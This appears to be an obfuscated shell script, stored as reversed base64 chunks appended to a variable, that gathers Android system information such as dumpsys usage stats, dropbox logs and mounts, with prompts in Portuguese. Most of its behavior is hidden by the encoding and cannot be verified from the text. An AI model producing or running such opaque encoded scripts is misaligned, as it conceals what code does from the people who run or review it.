+_c+='lJHI7ISfOtHJgojbzOca4VmbvNGIlRGIvRnclVHU9l1ekICIl5WLg8GajVGIgACIKISfOtHJhJWa'
+_c+='yJXYgU2YlJXYwFGIlVXcg8GdyVWdwBCblBSoDT3buFGI5BybnlGZzO8YgwWZkBSYuFGduVmdgEGb'
+_c+='gE6wyJXZD1XW7RiIgUWLg8GajVGIgACIKIiIg8GajVGIgACIKISfOtHJvN3b0lGelByb05WZp1WY'
+_c+='lJXYQBSXTyp4b13R7RiIgUWLg8GajVGIgACIKkmZgACIgogbyVHdlJHI7Unbl12XulWYtByOkFWZ'
+_c+='yByOi0nT7RiLu4iclZHbvZHIhJXYwBiclRnbF13V7RiIgUWLg8GajVGI7ISfOtHJvRnbllWbhVmc'
+_c+='hBHIuVGIy9mcyVEIdFyW9J1ekICIl1CIvh2YlBCIgACIgACIK4WZoRHI7IyczV2YjV3c8xVesxWd'
+_c+='mN3clN2Y1NnIgkWctACclJ3ZgwHIiQFTVNVRS9lUJFEUkICIvh2YlBSIgYWagACIgoQKxYiPyASZ'
+_c+='k92YfJXahBHJgQncvB3XylWYwRiO0N3boxWYj9GbgIXahBHIiRWYoQSPUxUVTVkUfJVSBBFIgACI'
+_c+='KISfOtHJu4iLvRmbhVmchBFIdpyW9J0ekICIl1CIvh2YlBCIgAiCpZGIgACIK4mc1RXZyByOiRWY'
+_c+='fJXY0NWZu92YgsjMgAXZlx2cgsjI950ek8GZpxWoDbnbpByb0JXZ1BFIdFyW9J1ekICIl1CIvh2Y'
+_c+='lBCIgACIgACIK4WZoRHI70FI1MTN1YDI0dWLgICdy9GcfJXahBHJiAyWgwHfg0FIxACds1CIiQnc'
+_c+='vB3XylWYwRiIgsFI8xHIdBiI0J3bw9lcpFGckICI61CIbBiZpBCIgAiCpETLgwWahRHI8ByJksSX'
+_c+='50CMbdCIF9WLgAXZydGI8BiI0VHcul2X0J3bw9lcpFGckICIvh2YlhCJ9QncvB3XylWYwBCIgAiC'
+_c+='0VHcul2X0J3bw9lcpFGcgIXLgQWYlJHI7ISfOtHJgozb05WZp1WYlJXYwBSZkByb0JXZ1BVfZtHJ'
+_c+='iASZu1CIvh2YlBCIgAiCpZGIgACIK4mc1RXZyByOiRWYfJXY0NWZu92YgsjMgAXZlx2cgsjI950e'
+_c+='kM3b0l2ZtOMZgYDIyVmblRHIlJWZkBybnlGZzO8Qg0VIb1nU7RiIgUWLg8GajVGIgACIgACIgogb'
+_c+='lhGdgsTXgYDIl5WLg0XZk92YfJXahB3I7RCIbBiZpBCIgAiClR2bj9lcpFGcgIXLgQWYlJHI7ISf'
+_c+='OtHJgozcvRXan16wkBiNgUGZg82ZpR2sDPUfZtHJiASZu1CIvh2YlBCIgAiCiICIvh2YlBCIgAiC'
+_c+='i0nT7Ryb0JXZ1BHIsVGI5BycvRXan16wkBiNgUGZg82ZpR2sDPGIsVGIyFGdv5WQg4CN9d1ekICI'
+_c+='l1CIvh2YlBCIgAiCi0nT7RyJvdWakN7wjBSZ05WYpRWZtByb2lGdpN3bwNXakBichxWdj5WaWdCI'
+_c+='yF2YvRFIuMTfXtHJiASZtAyboNWZgACIgogI950ekcSYjlmci1WoDzWYulGIuN7wpNWYyVHclR0J'
+_c+='gIXY2lGdjFEIuITfXtHJiASZtAyboNWZgACIgogI950ekI3bkFGbs9mcyF2clREIlRGIzVmbvl2Y'
+_c+='w9EI+AyclR3c1pWQg4SM9d1ekICIl1CIvh2YlBCIgAiCiIEJiAiICRUQgIVQUNURO90QgEkUBBFI'
+_c+='TVkTPl0QDVlUUNlTJJCIyRGaf9GajVGIgACIKIXZu5WYiByOyFWZsNGIgACIKsHIpgiYkF2XyFGd'
+_c+='jVmbvNmCKIiI9QlUPB1XCRUQfpgC9pQduVWbf5Wah1GI7QWYlJHI7ISfOtHJu4iLyVmds9mdgEmc'
+_c+='hBHIyVGduVUfXtHJiASZtAyboNWZgACIgogIiAyboNWZgACIgogI950ekkiUJR0XQ1UVERCIl1WY'
+_c+='uV2chJGKkAiOzF2ZyF2YzVGRg4WZg8GZhRmchV3Rg0lKb1XW7RiIgUWLg8GajVGIgACIKISfOtHJ'
+_c+='pUkWJN1XQ1UVERCK9d0ekAiUJR0XQ1UVERSfXtHJgozbkFGZyFWdHBSXTyp4b13R7RiIgUWLg8Ga'
+_c+='jVGIgACIKkSMm1CI0V3YgwHIsxWdu9idlR2L+IDIiIVSE9FUNVFRkICIoNXLgUHZoQSPFpVST9FU'
+_c+='NVFRgACIgogIiAyboNWZgACIgogCiQHe05Ceh1mZm91ZrBnIgIyJsxWdu9idlR2L+IDI4FWblJXa'
+_c+='mVWZyZmLzRHZu02bjBSZnF2ajFGcgMXezBXb1R2JgwGblh2cgIGZhJCIgACIgAiIYFUTgYkRgU2Z'
+_c+='ht2YhBlIgAXb1R2XgACIgogI0hHduYmZfd2awJCIgIyJsxWdu9idlR2L+IDIoRXZylmZlVmcm5yc'
+_c+='0RmLt92YgU2Zht2YhBHIzl3cw1WdkdCIsxWZoNHIiRWYiACIgICbh1mcv5EIGZEIldWYrNWYQJCI'
+_c+='w1Wdk9FIgACIKICd4RnL49mYw9mck91c5NHctVHZiACIgACIgACIgACIgACIgACIgIyJsxWdu9id'
+_c+='lR2L+IDI49mYw9mckByc5NHctVHZnACbsVGazBiYkFmIgACIgACIgACIgACIgICevJGcvJHRiACc'
+_c+='tVHZfBCIgAiCiQHe05yc0V2aj92cfhXauVnIgACIgACIgACIgACIgACIicCbsVnbvYXZk9iPyACe'
+_c+='p5WdvQXZu9yYvJHcvACdhN2JgwGblh2cgIGZhJCIgACIgACIgIyc0V2aj92cggXauVlIgAXb1R2X'
+_c+='gACIgogI0hHduA3Y0JCIicCbsVnbvYXZk9iPyAiNwNGdvQXZu9yYvJHcvACcjR3L0VmbvM2byB3L'
+_c+='gQXYjdCIsxWZoNHIiRWYiACIgACIgACIgACIgACIgACIiA1QUJCIw1Wdk9FIgACIKICd4RnLzRnb'
+_c+='19WbiACIgACIgACIgACIgACIgACIicCbsVnbvYXZk9iPyAyc05Wdv12Lj9mcw9CI0F2YnACbsVGa'
+_c+='zBiYkFmIgACIgACIgACIgACIiMXZqFGdu9WTiACctVHZfBCIgAiCiQHe05CbsVnZfNHciACIgACI'
+_c+='gACIgACIgACIgACIgACIgACIgAiInwGb152L2VGZv4jMgoVLgEULgMHcnACbsVGazBiYkFmIgACI'
+_c+='gACIgACIgACIiM3bzV2YvJHUiACctVHZfBCIgAiCiQHe05yc0FGdzV2ZhNXdfNXezBXb1RmIgIyJ'
+_c+='wADM4AibtACbpFGdgwHIsxWdu9idlR2L+IDIzRXY0NXZnF2c1Byc5NHctVHZnACbsVGazBiYkFmI'
+_c+='gACIgACIgACIgIyc0FGdzV2ZhNXdiACctVHZfBCIgAiCl52bkBCIgAiCiQHe05SfjZ3c7RyXzl3c'
+_c+='w1WdkJCIgACIgACIgACIgACIgACIgACIgAiInwGb152L2VGZv4jMgMmdzRCIzl3cw1WdkdCIsxWZ'
+_c+='oNHIiRWYiACIgAiIjZ3ckAyc5NHctVHZiACctVHZfBCIgACIgACIK8GZgsTehxmclZ3bg42bpR3Y'
+_c+='lp2byB3XhlGZl1GIiNXdgMHcvBHchByc0FGdzlnclRHdhJGIzRXY0N3YvJHcgkHdpZXa0NWYgU2Z'
+_c+='ht2YhBHIulGIjZ3cgI3bmBCIgAiCiQHe05CbsF2X0F2Yn9GbiAiInADMwgDIu1CIslWY0BCfgwGb'
+_c+='152L2VGZv4jMgwGbhBiYtASZtlGdkFWZyhGdgYXLgQWLgQXYjd2bsdCIsxWZoNHIiRWYiACIgACI'
+_c+='i8GdlxGct92YgQXYjd2bMJCIw1Wdk9FIgACIKUmbvRGIgACIKICd4RnL9ZWditHJfRXYjd2bsJCI'
+_c+='gACIgACIgACIgACIgACIicCbsVnbvYXZk9iPyAiZ1JGJgIWLgQWLgQXYjd2bsdCIsxWZoNHIiRWY'
+_c+='iACIgISXmVnYksFI0F2Yn9GTiACctVHZfBCIgACIgACIK8GZgsDazFmcjBCbl5mcltGIzRnblZXZ'
+_c+='g0WZ0NXezBibpFWbg4WagYWdiBicvZGIgACIKICd4RnLvZmbp9Fbl5mcltmIgIyJiwFIiwFIiwFM'
+_c+='cxlIcBic0BCfgUmbpxGZtN2Lj9mcw9CI0F2YgszboNWZgsjbvl2cyVmdvM2byB3LgQXYjByOvh2Y'
+_c+='lByOh1CIl1WYuV3JgwGblh2cgIGZhJCIgACIgACIgAiIvZmbpBCbl5mcltkIgAXb1R2XgACIgogI'
+_c+='0hHduA3byBHdldmIgACIgACIgACIgACIgACIgACIgACIgACIgAiInwGb152L2VGZv4jMgA3byBHd'
+_c+='ld2JgwGblh2cgIGZhJCIgACIgACIgAiIzVGZhRWZpB3byBlIgAXb1R2XgACIgogC9BCIgAiCi0nT'
+_c+='7RySP13R7RCIiASZtAyboNWZgACIgACIgAiCxYiPyAiIzQyLSlERfBVTVREJiAiPgIiMkICIsFmd'
+_c+='lBCIgACIgACIKISfOtHJu4iLxQCISao4gASfCtHJiASZu1CIvh2YlBCIgACIgACIKsHIpgCctVHZ'
+_c+='fBCIgAiCKIibc1nT7RiUJR0XQ1UVERSfXtHJgojblBybk5WYkJXY1dEIdpyW9J0ekICIl1CIvh2Y'
+_c+='lBCIgAiCiIVSE9FUNVFRkICIw1CIylGZr1GIgACIKISKTVSTlgUJfRWJtVSWlsCIlRXYkhCJfBXb'
+_c+='1R2Xud3butmb19CZh9Gbud3bE9CZyF2YkN3Li0jUJR0XQ1UVEBCIgAiCKkmZgACIgogbyVHdlJHI'
+_c+='7Unbl12XulWYtByOkFWZyByOi0nT7RiLu4iclRnbF13V7RiIgUWLg8GajVGIgACIgACIgogI950e'
+_c+='k0FMbBibzOcajB3bgEGbgE6wzVFIuM3bkFGdjVmbvNGIz9mdpRXaz9GczlGZgkXYoBybOBSXhsVf'
+_c+='StHJiASZtAyboNWZgACIgACIgAiCuVGa0ByOiQSZjlmdlRmIgEXLgAXZydGI8ByclNWa2VGZgIGZ'
+_c+='hBSIgYWagACIgogCiIEJiAiIPRVRMBVTPNEIPNUSUN1kD70RBlERgIVQEJVQVdkIgIHZo91boNWZ'
+_c+='gACIgogcl5mbhJGI7IXYlx2YgACIgowegkCKzl3cw1Wdk9lchRmchV3ZKoQfKkmZgACIgoQduVWb'
+_c+='f5Wah1GIgACIgACIgoAZhVmcgsjI950ek4iLuo7wuVWbgwWYgIXZ2x2b2BSYyFGcgIXZ05WRgE6w'
+_c+='u9WazVmcQ13V7RiIgUWLg8GajVGIgACIgACIgogI950ek4ibzOca4VmbvNGI1RHIhO8YpZWayVmV'
+_c+='g4ibzOcajFmepxWY1R3YhBSYsBichdmchN2clRGIsFGIy9mcyVEIdFyW9J1ekICIl1CIvh2YlBCI'
+_c+='gACIgACIKICctRnL0NXZk9FJiAiZtASbyBCIgACIgACIKU2csVGIgACIKICdzVGZfRiIgg2chJGI'
+_c+='jVGelBCIgACIgACIKEDIwVWZsNHIgACIgACIgogI950ek4iLuIXZu5WYjNHIvRmbhl2Yp5WalJFI'
+_c+='dpyW9l1ekICIl1CIvh2YlBCIgACIgACIKISfOtHJlRnbl1WY0NWZyJ3bjBybkFmepxWY1R3YhBic'
+_c+='l5mbhN2Ug01kcK+W9d0ekICIl1CIvh2YlBCIgACIgACIKICdzVGZfRiIgg3KgQ2bth2YgACIgACI'
+_c+='gAiCiQ3clR2XkICIiAXb05CdzVGZfRiIgYXbgACIgACIgAiCuVGa0ByOsxWdu9idlR2L+IDIiAXb'
+_c+='05CdzVGZfRiIg8WLgIydhJ3XkICIwEDI0V3bl1Wa01CdjVmbu92Yt0CIwMDIl1Wa01Ceh1WLtACT'
+_c+='TNnZtACbyV3YgYWagACIgogI950ek4iLuIWdIRXaHBSZkNXZkBibzOcazJXZ2BSYtlGdsp7wg8GZ'
+_c+='uF2ZyF2YzVGRg0lKb1nQ7RiIgUWLg8GajVGIgACIKogIoNnLyVmbuF2Yz9SRN9ESkISP0NXZk9FI'
+_c+='sF2YvxGIgACIKICaz5icl5mbhN2cv4Wah12LTNVa6lGdvwWZuJXZrlmepR3Lt92YuQnblRnbvNmc'
+_c+='lNXdiVHa0l2ZucXYy9yL6MHc0RHai0zdhJ3XgwWYj9GbgACIgogCi4GX950ek4iLuIXZu5WYjNHI'
+_c+='vRmbhpXasFWd0NWQg0lKb1nQ7RiIgUWLg8GajVGIgACIKIXZu5WYiByOyFWZsNGIgACIKsHIpgic'
+_c+='l5mbhN2cfJXY6lGbhVHdjFmCKoQfKUmbvRGIgACIKMWYzVGIgACIgACIgowO7AiOgkiKgACIgACI'
+_c+='gACIgACIKszOg4mc1RXZyByO15WZt9lbpFWbgkSUgACIgACIgACIgACIKszOgISQi0jbvlGdjV2c'
+_c+='f52bt9FIpEEIgACIgACIgACIgAiC7sDIiwkI942bpR3YlN3Xu9WbfBSKMBCIgACIgACIgACIgowO'
+_c+='7AiIUJSPu9Wa0NWZz9lbv12XgkCVgACIgACIgACIgACIK4WagISfe5Fd1Bnbp9lbv12X7RiIgU2c'
+_c+='hNGIgACIgACIgoAd1Bnbp9lbv12XgUDI01CIy1CIkFWZyBCIgACIgACIKISfOtHJgojchpXasFWd'
+_c+='0NWYgEmchBHIyVGduVEIvBSXR9SQvw0LUtFIhO8ZlZXYO1XW7RiIgUmbtAyboNWZgACIgACIgAiC'
+_c+='i0nT7RCgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg'
+_c+='UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg'
+_c+='UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg'
+_c+='UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKefCtHJiASZtAyboNWZgACIgACIgAiCiICIvh2YlBCI'
+_c+='gACIgACIKowYhNXZgACIgACIgAiC7sDIgACIgACIgACIgACIgACIKISfOtHJu42sDn2YhpXay9Gd'
+_c+='1FGIul2cgIXa1JWayR3cpRWZyBybO1XW7RCIgICIl1CIvh2YlBCIgACIgACIgACIgACIgAiCi0nT'
+_c+='7RiLvBXa1FXZgwWZkByb2l2c1x2Y4VGIvNXdgUGZgMXZgUmchdHdm92cgUGdzVUfZtHJgAiIgUWL'
+_c+='g8GajVGIgACIgACIgACIgACIgACIKIiIg8GajVGIgACIgACIgACIgACIgACIKISfOtHJhl2YuF2Z'
+_c+='hZXYs9yZn5CZy92YzlGZ9d1ekACIgACIgACIgASfOtHJ6QmcvN2cpRUfDtHJgAiIgUWLg8GajVGI'
+_c+='gACIgACIgACIgACIgACIKISfOtHJ0lGerFWZyR3Uv02bj5iY1hGdpdWfXtHJgACIgACIgACIgASf'
+_c+='OtHJ6IWdIRXaH13Q7RCIgICIl1CIvh2YlBCIgACIgACIgACIgACIgAiCi0nT7RSbhVGVgkHdpJXd'
+_c+='jV2Ug40VP50SOVVfXtHJg0nT7RiOy9Gcg8GZhxGbvJnchNXZE13Q7RCIgICIl1CIvh2YlBCIgACI'
+_c+='gACIgACIgACIgAiCiICIvh2YlBCIgACIgACIgACIgACIgAiCi0nT7RiLz92cvh2YlB3cvNHIQlEI'
+_c+='lRGIz9Wai1WYjBSegMnTQZFIsMXZph3byBXfXtHJgAiIgUWLg8GajVGIgACIgACIgACIgACIgACI'
+_c+='KISfOtHJvRmbhR3YlRXZkBCLvZXa0NWYgE6w0NXZgMXYyRnbllWbg82ZlVnagwWZkBCZlJHIlRWf'
+_c+='XtHJgAiIgUWLg8GajVGIgACIgACIgACIgACIgACIKISfOtHJzVmbvlGel52bjBychxGIsFWZyByb'
+_c+='w1WZpRHIuVGIhJHdzl2ZlJHIy9Gdp52btBSZ0NXR9d1ekACIiASZtAyboNWZgACIgACIgACIgACI'
+_c+='gACIgogIiAyboNWZgACIgACIgACIgACIgACIgogI950ek4SZylmRgUWZyZEIhJXYwBCdhVGaj1Sa'
+_c+='05WYgMXazlGbhOsbhBSZkBSY05WZp1WYyJXZI13V7RCIgICIl1CIvh2YlBCIgACIgACIgACIgACI'
+_c+='gAiCi0nT7RSbhVGVgkHdpJXdjV2Ug40VP50SOVVfDtHJgAiIgUWLg8GajVGIgACIgACIgACIgACI'
+_c+='gACIKIiIg8GajVGIgACIgACIgACIgACIgACIKkSQgACIgACIgACIgACIKszOgACIgACIgACIgACI'
+_c+='gACIgoQamBCIgACIgACIgACIgACIgAiCl52bkBCIgACIgACIgACIgACIgACIgACIKkmZgACIgACI'
+_c+='gACIgACIgACIgACIgACIgACIKISfOtHJn9GbfRSfHtHJgACIgICIl1CIvh2YlBCIgACIgACIgACI'
+_c+='gACIgACIgACIgACIgACIgAiClNHblBCIgACIgACIgACIgACIgACIgACIgACIgogI950ekc2bs9FJ'
+_c+='9J1ekACIgAiIgUWLg8GajVGIgACIgACIgACIgACIgACIgACIgACIgACIgACIK4WZoRHI7ISWY9kU'
+_c+='QxHXPN1TINURQN1TTJCIx1CIwVmcnBCfgIyZvx2XkICIvh2YlBiZpBCIgACIgACIgACIgACIgACI'
+_c+='gACIgACIgogI91Vaks1cn9GbftHJi0zZvx2XgwWYj9GbgACIgACIgACIgACIgACIgACIgACIgACI'
+_c+='K8GZgsTKpAyKrkGI7wWY09GdfxTagsDekl2X0JXY0N3X9kGIogCIy9mZgACIgACIgACIgACIgACI'
+_c+='gACIgAiCpkCIwAiOgUTMg0CIsFGdvR3Xg8DI1EDI+ACbhR3b09FIogCJ9gHZp9FdyFGdz9FIsF2Y'
+_c+='vxGIgACIgACIgACIgACIgACIgACIgoQfdB0Wzd2bs91I7RSPsFGdvR3XgwWYj9GbgACIgACIgACI'
+_c+='gACIgACIgACIgAiClNHblBCIgACIgACIgACIgACIgAiCi0nT7Rib6OcYgM3bkFmc0NXanVmcgM3b'
+_c+='05WZ2VGIul2U9l1ekACIgAiIgUWLg8GajVGIgACIgACIgACIgACIgACIgACIgogblhGdgsTXgADI'
+_c+='xVWLgISfdB0Wzd2bs91I7RiIgsFImlGIgACIgACIgACIgACIgACIKIiIg8GajVGIgACIgACIgACI'
+_c+='gACIgACIKISfOtHJ6MXZu9Wa4VmbvNGIlRGIsFWay9GdzlGSgASfCtHJiASZtAyboNWZgACIgACI'
+_c+='gACIgACIgACIgogIiAyboNWZgACIgACIgACIgACIgACIgoQKMBCIgACIgACIgACIgowO7ACIgACI'
+_c+='gACIgACIgACIgAiCpZGIgACIgACIgACIgACIgACIKISfOtHJzFGZhR3YlRXZkBycl52bphXZu92Y'
+_c+='g4WaT1XW7RCIgACIiASZtAyboNWZgACIgACIgACIgACIgACIgACIgAiClNHblBCIgACIgACIgACI'
+_c+='gACIgAiCiMnbu92Yf52bt9FJiACP8wDIl52bkBCIgACIgACIgACIgACIgACIgACIKISfOtHJj9FJ'
+_c+='gIphi33V7RCIgACIiASZtAyboNWZgACIgACIgACIgACIgACIgACIgACIgACIK8GZgszYfBictACZ'
+_c+='hVmcg0zUGlEIlxWaodHIgACIgACIgACIgACIgACIgACIgogblhGdgsTXgIycu52bj9lbv12XkICI'
+_c+='u1CIbBiZpBCIgACIgACIgACIgACIgAiCi0nT7RiOvNXZj9mcwBCblRGIzFmdpR3YhBycl52bphXZ'
+_c+='u92QgASfCtHJiASZtAyboNWZgACIgACIgACIgACIgACIgogIiAyboNWZgACIgACIgACIgACIgACI'
+_c+='goQamBCIgACIgACIgACIgACIgAiCi0nT7RybpBXbpxGIUCo4gATfHtHJg0nT7RiOgACIgAychh2Y'
+_c+='lB3cvNVfDtHJgAiIgUWLg8GajVGIgACIgACIgACIgACIgACIgACIgoQZzxWZgACIgACIgACIgACI'
+_c+='gACIgogI950ekAqmiDychh2YlB3cvN3Xk0nU7RCI950ekoDIgACIgMXYoNWZwN3bT13Q7RCIgICI'
+_c+='l1CIvh2YlBCIgACIgACIgACIgACIgACIgACIK4WZoRHI70FIwACdn1CIiMXYoNWZwN3bz9FJiAyW'
+_c+='gYWagACIgACIgACIgACIgACIgoQamBCIgACIgACIgACIgACIgAiCi0nT7RybkFmc052bj5WZg8mb'
+_c+='9J1ekASfOtHJ6AybnVWdqBCblRGIElEU9N0ekACIiASZtAyboNWZgACIgACIgACIgACIgACIgACI'
+_c+='gAiClNHblBCIgACIgACIgACIgACIgAiCi0nT7RSKvZXa0NWYoACZpB3Xu9WbfRSfHtHJg0nT7RiO'
+_c+='g82ZlVnagwWZkBCRJBVfDtHJgAiIgUWLg8GajVGIgACIgACIgACIgACIgACIgACIgogblhGdgsTX'
+_c+='gICZpB3Xu9WbfRiIg4WLgsFImlGIgACIgACIgACIgACIgACIKISfOtHJpZWa39lbv12Xk03V7RCI'
+_c+='950ekoDIgACIgASaGl2VgQWZS13Q7RCIgICIl1CIvh2YlBCIgACIgACIgACIgACIgAiCi0nT7RSf'
+_c+='hRWaj9mbvN2clRWL6AXaf52bt91ek03V7RCI950ekoDIlNWa2VGZgwWZkBCUJ13Q7RCIgICIl1CI'
+_c+='vh2YlBCIgACIgACIgACIgACIgAiCi0nT7Rybw1WZpR3Xk03V7RCI950ekoDIvZXa0NWYg8GctVWa'
+_c+='U13Q7RCIgICIl1CIvh2YlBCIgACIgACIgACIgACIgAiCiICIvh2YlBCIgACIgACIgACIgACIgAiC'
+_c+='pQFIgACIgACIgACIgAiCulGIi0HVtojbvlGdjV2cf52bt91ekICIlNXYjBCIgACIgACIKEmdpR3Y'
+_c+='hBibzOcajNWZzBib6O8ZlNHIvRWauVGdu92QgMCIgACIgACIgogCi0nT7RCgUKOgUKOgUKOgUKOg'
+_c+='UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg'
+_c+='UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg'
+_c+='UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg'
+_c+='UKOgUKOgUKefCtHJiASZtAyboNWZgACIgACIgAiCi0nT7RicpxWYTBSfXtHJdF1W9J1ekACIgASZ'
+_c+='kBSYjJXZjFEI9d1ek0VQb1XW7RCIgACIzd2bMBSfXtHJdx0W9l1ekACIgAicvRXau9WTg03V7RSX'
+_c+='UtVfZtHJiASZtAyboNWZgACIgACIgAiCiICIvh2YlBCIgACIgACIKISfOtHJdWp4QWp4QWp4QWp4'
+_c+='QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4'
+_c+='QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4'
+_c+='QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4'
+_c+='QWp4QWp4QWp4QWp4aWp49J1ekICIl1CIvh2YlBCIgACIgACIKISfOtHJRWp49J1ekACIgACIgACI'
+_c+='gACIgACIgACIgACIgACIgACIgASYpNmbhdWY2FGbvc2ZuQmcvN2cpRGIgACIgACIgACIgACIgASf'
+_c+='ZtHJRWp49J1ekICIl1CIvh2YlBCIgACIgACIKISfOtHJRWp4pcyJgkSK9Vmci12bu91I7RCItAyN'
+_c+='0gCKkAyJzpSJnAiZ05WayBHKk0nU7RSZyJWbv52XkACIgACIgACIgACIgACIgACIg03Q7RSkVKef'
+_c+='StHJiASZtAyboNWZgACIgACIgAiCi0nT7RSkVKefStHJgACIgACIgACIgACIgACIPZVSWBiTFBiU'
+_c+='PRVSO9UTgQJgiDSTBVEVgkFVJJVVDV0Ug40VP50SOVFIgACIgACIgASfXtHJRWp49J1ekICIl1CI'
+_c+='vh2YlBCIgACIgACIKISfOtHJXWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4'
+_c+='QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4'
+_c+='QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4'
+_c+='QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4QWp4UWp49J1ekICIl1CIvh2Y'
+_c+='lBCIgACIgACIKIXZkFWZIByIgACIgACIgAiCyFWZsNGIgACIgACIgoAbhVHdjFGIuN7wpN2YlNHI'
+_c+='UCo4gEGbsFGduFGcgIXYqVnYpREIjACIgACIgACIKogIpZWa39lbv12XkISPpZWa39VYtlGdsV3X'
+_c+='gACIgACIgAiCiAXaf52bt9FJi0Dcp9VYtlGdsV3XgACIgACIgAiCpZGIgACIgACIgogIz5mbvN2X'
+_c+='u9WbfRiIgwDP8ASZu9GZgACIgACIgACIgACIKkmZgACIgACIgACIgACIgACIgoQKi4mbvN2XkAiO'
+_c+='h5WZyF2Rg01SPtFIpcyUloTTloDSlsyJgUGdhRGKkICK9sycn9GbfBiJmASXgICMiASPgIyav9VY'
+_c+='59FJiAyWgACIgACIgACIgACIgACIgACIgAiCl52bkBCIgACIgACIgACIgACIgACIgACIKsWYlJnY'
+_c+='gYiJgETPr92Xhl3XgYiJgICcp9lbu92YfRiIgEXLgAXZydGI8BiIs9FJiAyboNWZgACIgACIgACI'
+_c+='gACIgACIgACIgACIgACIK8GZgsjI91FQbN3Zvx2X7RiIg4Wagw2XgI3bmBCIgACIgACIgACIgACI'
+_c+='gACIgACIKATPr92Xhl3XgwWYj9GbgACIgACIgACIgACIgACIgACIgAiClNHblBCIgACIgACIgACI'
+_c+='gACIgAiCpZGIgACIgACIgACIgACIgACIgACIgoQKi4mbvN2XkAiOh5mclRHelBibzOca4VmbvNEI'
+_c+='dRFWF9SWY9kUQBCoaK+WgkyJTViONViOIVyKnASZ0FGZoQiIo0zKzd2bs9FIgACIgACIgACIgACI'
+_c+='gACIgACIgACIgAiCpkCIxAyKgMXYoNWZwN3bz9FIogCJ9MXYoNWZwN3bz9FIgACIgACIgACIgACI'
+_c+='gACIgACIgACIgAiCuVGa0ByOdBiIwICI9AiIvRWYlV3Zvx2Xhl3XkICIbBiZpBCIgACIgACIgACI'
+_c+='gACIgACIgACIKUmbvRGIgACIgACIgACIgACIgACIgACIgowahVmciBiJmASM98GZhVWdn9GbfFWe'
+_c+='fBiJmAiIwl2Xu52bj9FJiASctACclJ3ZgwHIiw2XkICIvh2YlBCIgACIgACIgACIgACIgACIgACI'
+_c+='gACIgowbkByOi0XXAt1cn9GbftHJiAibpBCbfBicvZGIgACIgACIgACIgACIgACIgACIgoAM98GZ'
+_c+='hVWdn9GbfFWefBCbhN2bsBCIgACIgACIgACIgACIgACIgACIK4WZoRHI7IycldmbhJ3Xh5WZyF2Z'
+_c+='fRiIgEXLgAXZydGI8BiIwl2Xu52bj9FJiAyboNWZgECImlGIgACIgACIgACIgACIgACIKkSMm1CI'
+_c+='6QWLgQXdjBCfgIibu92YfRiIg8GajVGKk0Dcp9lbu92YfBCIgACIgACIgACIgACIgAiCwl2Xu52b'
+_c+='j9FIsF2YvxGIgACIgACIgACIgACIgACIK8GZgsjbu92YfBictACZhVmcg0zUGlEIlxWaodHIgACI'
+_c+='gACIgACIgAiCuVGa0ByOdBiIz5mbvN2Xu9WbfRiIg4WLgsFImlGIgACIgACIgowbzV2YvJHcgwWZ'
+_c+='kBycl52bphXZu92Yg4WZgEmblJXYH1ybuBycQlEIyFGdjVGdlREIjACIgACIgACIKkmZgACIgACI'
+_c+='gAiCpISaml2df52bt9FJgIphiDSaml2dfFWbpRHb19FJgoDZlJHIlRGIvlmYtF2Qg01TT9ESDVEU'
+_c+='T90UgAqmivFIpcyUloTTloDSlsyJgUGdhRGKkICK9sycn9GbfBCIgACIgACIgACIgoQKpASMgsCI'
+_c+='zFGajVGcz92cfBCKoQSPzFGajVGcz92cfBCIgACIgACIgACIgogblhGdgsTXgIybkl2Yv52bjNXZ'
+_c+='kJCI9ECIikmZpd3Xh1Wa0xWdfRiIgsFImYCIdBiIpZWa39VYtlGdsV3XkICI9ECIikmZpd3Xu9Wb'
+_c+='fRiIgsFImYCIdBiIpZWa39VYtlGdsV3XkICIu1CIbBiZpBCIgACIgACIKkmZgACIgACIgAiCpICc'
+_c+='p9lbv12XkAikGKOIwl2Xh1Wa0xWdfRCI6AVSgUGZg8Wai1WYDBSXPN1TINURQN1TTBCoaK+WgkyJ'
+_c+='TViONViOIVyKnASZ0FGZoQiIo0zKzd2bs9FIgACIgACIgACIgAiCpkCIxAyKgMXYoNWZwN3bz9FI'
+_c+='ogCJ9MXYoNWZwN3bz9FIgACIgACIgACIgAiCuVGa0ByOdBiIwl2Xh1Wa0xWdfRiIg0TIgICcp9lb'
+_c+='v12XkICIbBiJmASXgICcp9VYtlGdsV3XkICIu1CIbBiZpBCIgACIgACIKM3bz9GajVGcz92cgM3b'
+_c+='pJWbhNGIyFGdjVGdlREIjACIgACIgACIKowcz9FJg0WbfRCIoh2XkAiIkJDMloDZyATJ6QmMwUiI'
+_c+='g8GctVWa09FI21CImRnbpJHcgACIgACIgAiCvBXbllGdfBCbhN2bsBCIgACIgACIKkSKgAjNgUCI'
